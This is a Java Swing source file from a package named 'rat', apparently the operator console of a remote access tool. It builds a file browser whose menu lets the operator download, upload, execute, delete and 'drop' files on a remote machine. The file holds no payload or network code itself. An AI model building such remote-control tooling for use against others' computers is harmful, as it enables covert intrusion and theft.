/*
 * Copyright 2016 Johannes Boczek
 */

package de.sogomn.rat.gui.swing;

import static de.sogomn.rat.util.Resources.ICON_ARROW_DOWN;
import static de.sogomn.rat.util.Resources.ICON_ARROW_UP;
import static de.sogomn.rat.util.Resources.ICON_EXCLAMATION_MARK;
import static de.sogomn.rat.util.Resources.ICON_FILE;
import static de.sogomn.rat.util.Resources.ICON_FILE_DELETE;
import static de.sogomn.rat.util.Resources.ICON_FOLDER;
import static de.sogomn.rat.util.Resources.ICON_FOLDER_PLUS;
import static de.sogomn.rat.util.Resources.ICON_FOLDER_UP;
import static de.sogomn.rat.util.Resources.ICON_POINTER;
import static de.sogomn.rat.util.Resources.ICON_QUESTION_MARK;
import static de.sogomn.rat.util.Resources.ICON_WORLD_DOWN;

import java.awt.Component;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.image.BufferedImage;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Enumeration;

import javax.swing.DefaultListCellRenderer;
import javax.swing.DefaultListModel;
import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.ListSelectionModel;
import javax.swing.SwingUtilities;
import javax.swing.event.ListSelectionListener;

import de.sogomn.rat.gui.IFileBrowserGui;

public final class FileBrowserSwingGui extends AbstractSwingGui implements IFileBrowserGui {
	
	private JList<String> rootList;
	private JList<FileEntry> fileList;
	private FileCellRenderer fileListRenderer;
	private JScrollPane scrollPane;
	private JSplitPane splitPane;
	private JMenuBar menuBar;
	private JButton directoryUp, upload, newDirectory;
	private JPopupMenu menu;
	private JMenuItem request, download, execute, delete, dropFile, information;
	
	private DefaultListModel<String> rootListModel;
	private DefaultListModel<FileEntry> fileListModel;
	private Path directory;
	
	private static final Dimension SIZE = new Dimension(750, 550);
	private static final int DIVIDER_SIZE = 5;
	private static final double SPLIT_PANE_RESIZE_WEIGHT = 0.25;
	
	public FileBrowserSwingGui() {
		rootList = new JList<String>();
		fileList = new JList<FileEntry>();
		fileListRenderer = new FileCellRenderer(ICON_FILE, ICON_FOLDER);
		scrollPane = new JScrollPane(fileList, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
		splitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, rootList, scrollPane);
		menuBar = new JMenuBar();
		directoryUp = createButton(DIRECTORY_UP, ICON_FOLDER_UP);
		upload = createButton(UPLOAD, ICON_ARROW_UP);
		newDirectory = createButton(NEW_DIRECTORY, ICON_FOLDER_PLUS);
		menu = new JPopupMenu();
		request = createMenuItem(REQUEST, ICON_QUESTION_MARK);
		download = createMenuItem(DOWNLOAD, ICON_ARROW_DOWN);
		execute = createMenuItem(EXECUTE, ICON_POINTER);
		delete = createMenuItem(DELETE, ICON_FILE_DELETE);
		dropFile = createMenuItem(DROP_FILE, ICON_WORLD_DOWN);
		information = createMenuItem(INFORMATION, ICON_EXCLAMATION_MARK);
		rootListModel = new DefaultListModel<String>();
		fileListModel = new DefaultListModel<FileEntry>();
		directory = Paths.get("");
		
		final ListSelectionListener rootListener = l -> {
			final boolean adjusting = l.getValueIsAdjusting();
			
			if (adjusting) {
				notifyListeners(controller -> controller.userInput(REQUEST_ROOT, this));
			}
		};
		final ListSelectionListener fileListener = l -> {
			rootList.setSelectedValue(null, false);
		};
		
		menu.add(request);
		menu.add(download);
		menu.add(upload);
		menu.add(execute);
		menu.add(delete);
		menu.add(newDirectory);
		menu.add(dropFile);
		menu.add(information);
		menuBar.add(directoryUp);
		menuBar.add(upload);
		menuBar.add(newDirectory);
		splitPane.setDividerSize(DIVIDER_SIZE);
		splitPane.setResizeWeight(SPLIT_PANE_RESIZE_WEIGHT);
		fileList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
		fileList.setModel(fileListModel);
		fileList.setCellRenderer(fileListRenderer);
		fileList.setComponentPopupMenu(menu);
		fileList.addListSelectionListener(fileListener);
		rootList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
		rootList.addListSelectionListener(rootListener);
		rootList.setModel(rootListModel);
		
		frame.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
		frame.setContentPane(splitPane);
		frame.setJMenuBar(menuBar);
		frame.setPreferredSize(SIZE);
		frame.pack();
		frame.setLocationRelativeTo(null);
	}
	
	private JMenuItem createMenuItem(final String name, final BufferedImage image) {
		final JMenuItem item = new JMenuItem(name);
		final ImageIcon icon = new ImageIcon(image);
		
		item.setActionCommand(name);
		item.addActionListener(this::actionPerformed);
		item.setIcon(icon);
		
		return item;
	}
	
	private JButton createButton(final String name, final BufferedImage image) {
		final ImageIcon icon = new ImageIcon(image);
		final JButton button = new JButton(name, icon);
		
		button.setActionCommand(name);
		button.addActionListener(this::actionPerformed);
		
		return button;
	}
	
	private void actionPerformed(final ActionEvent a) {
		final String actionCommand = a.getActionCommand();
		
		notifyListeners(controller -> controller.userInput(actionCommand, this));
	}
	
	private void addEntry(final String name, final boolean directory) {
		final FileEntry entry = new FileEntry(name, directory);
		
		SwingUtilities.invokeLater(() -> {
			fileListModel.addElement(entry);
		});
	}
	
	private FileEntry getEntryByName(final String name) {
		final Enumeration<FileEntry> entries = fileListModel.elements();
		
		while (entries.hasMoreElements()) {
			final FileEntry entry = entries.nextElement();
			
			if (entry.name.equals(name)) {
				return entry;
			}
		}
		
		return null;
	}
	
	@Override
	public void addFile(final String name) {
		addEntry(name, false);
	}

	@Override
	public void addPath(final String path) {
		final Path file = Paths.get(path);
		final Path relativePath = directory.relativize(file);
		final int level = relativePath.getNameCount();
		
		if (level == 1) {
			final String name = relativePath.getFileName().toString();
			
			addEntry(name, false);
		}
	}
	
	@Override
	public void addDirectory(final String name) {
		addEntry(name, true);
	}
	
	@Override
	public void addDirectoryPath(final String path) {
		final Path file = Paths.get(path);
		final Path relativePath = directory.relativize(file);
		final int level = relativePath.getNameCount();
		
		if (level == 1) {
			final String name = relativePath.getFileName().toString();
			
			addEntry(name, true);
		}
	}
	
	@Override
	public void addRoot(final String name) {
		SwingUtilities.invokeLater(() -> {
			rootListModel.addElement(name);
		});
	}
	
	@Override
	public void removeEntry(final String name) {
		SwingUtilities.invokeLater(() -> {
			fileListModel.removeElement(name);
		});
	}

	@Override
	public void removeEntryPath(final String path) {
		final Path relativePath = Paths.get(path).relativize(directory);
		final int level = relativePath.getNameCount();
		
		if (level == 1) {
			final String name = relativePath.getFileName().toString();
			
			SwingUtilities.invokeLater(() -> {
				fileListModel.removeElement(name);
			});
		}
	}
	
	@Override
	public void removeRoot(final String name) {
		SwingUtilities.invokeLater(() -> {
			rootListModel.removeElement(name);
		});
	}

	@Override
	public void clearFiles() {
		SwingUtilities.invokeLater(() -> {
			fileListModel.clear();
		});
	}
	
	@Override
	public void clearRoots() {
		SwingUtilities.invokeLater(() -> {
			rootListModel.clear();
		});
	}
	
	@Override
	public void setDirectoryPath(final String path) {
		directory = Paths.get(path);
	}
	
	@Override
	public boolean isDirectory(final String name) {
		final FileEntry entry = getEntryByName(name);
		
		return entry != null && entry.directory;
	}

	@Override
	public String getCurrentDirectory() {
		return directory.toString().replace("\\", "/");
	}
	
	@Override
	public String getParentDirectory() {
		final Path parent = directory.getParent();
		
		if (parent != null) {
			return parent.toString();
		}
		
		return null;
	}

	@Override
	public String getSelectedFile() {
		return fileList.getSelectedValue().name.replace("\\", "/");
	}
	
	@Override
	public String getSelectedFilePath() {
		final String file = fileList.getSelectedValue().name.replace("\\", "/");
		
		String path = getCurrentDirectory();
		
		if (file.endsWith("/")) {
			path += file;
		} else {
			path += "/" + file;
		}
		
		return path;
	}
	
	@Override
	public String getSelectedRoot() {
		return rootList.getSelectedValue().replace("\\", "/");
	}
	
	private class FileEntry {
		
		final String name;
		final boolean directory;
		
		public FileEntry(final String name, final boolean directory) {
			this.name = name;
			this.directory = directory;
		}
		
	}
	
	public static final class FileCellRenderer extends DefaultListCellRenderer {
		private static final long serialVersionUID = 7899145670559346634L;
		
		private Icon fileIcon, directoryIcon;
		
		public FileCellRenderer(final Icon fileIcon, final Icon directoryIcon) {
			this.fileIcon = fileIcon;
			this.directoryIcon = directoryIcon;
		}
		
		public FileCellRenderer(final BufferedImage fileIcon, final BufferedImage directoryIcon) {
			this(new ImageIcon(fileIcon), new ImageIcon(directoryIcon));
		}
		
		@Override
		public Component getListCellRendererComponent(final JList<?> list, final Object value, final int index, final boolean isSelected, final boolean cellHasFocus) {
			if (!(value instanceof FileEntry)) {
				return super.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);
			}
			
			final FileEntry entry = (FileEntry)value;
			final Component component = super.getListCellRendererComponent(list, entry.name, index, isSelected, cellHasFocus);
			final JLabel label = (JLabel)component;
			
			if (entry.directory) {
				label.setIcon(directoryIcon);
			} else {
				label.setIcon(fileIcon);
			}
			
			return label;
		}
		
	}
	
}
